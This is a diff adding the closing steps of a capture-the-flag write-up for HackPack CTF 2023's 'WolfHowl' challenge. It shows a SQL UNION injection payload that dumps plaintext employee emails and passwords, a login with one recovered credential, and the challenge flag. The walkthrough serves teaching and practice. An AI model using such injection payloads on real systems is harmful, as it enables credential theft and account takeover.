@@ -20,3 +20,13 @@ We're interested in the employee table because of the elevated privileges that'd
 
 Sure enough, we see the email and password columns at the bottom, so let's get all employee emails and passwords with `" UNION SELECT Email, Password, NULL, NULL FROM employee -- "`:
 
+![](https://github.com/mt3636/HackPack-CTF-2023/blob/main/WolfHowl/images/usernamesandpasswords.png)
+
+Look at that! We have all the employee emails and passwords in plaintext right in front of us! Let's see what happens when we log in as one:
+
+    Email: andrew@chinookcorp.com
+    Password: PASSWORD
+
+Yay, we get our flag displayed on the page after logging in!
+
+    flag{art_decorates_space_but_music_decorates_time}
